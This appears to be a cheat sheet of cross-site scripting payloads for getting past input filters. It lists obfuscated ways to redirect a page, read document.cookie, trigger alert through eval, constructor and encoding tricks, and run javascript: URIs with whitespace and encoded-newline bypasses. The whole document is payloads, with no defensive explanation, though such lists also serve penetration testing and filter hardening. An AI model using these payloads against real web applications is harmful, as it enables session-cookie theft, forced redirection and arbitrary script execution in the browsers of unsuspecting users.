# XSS-Bypass-Filters

### Redirection
```
document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location=
window.location.assign()
window['location']['href']=
document.location.replace()
```

### Link

```
//google.com/?=a
//134744072:1234/?a= (decimal ip)
```

### Cookies

```
document.cookie 
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]
```

### Alert
```
alert(1)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
eval('ale'+'rt(0)');
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();
top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);
open('java'+'script:ale'+'rt(11)');
setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```
## Href
```
javascript:alert(1)
javascript:prompt(1)
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
java\tscript:alert(1)
java\rscript:alert(1)
java\tscript:alert(1)
javascript:ale'+'rt(12)
```
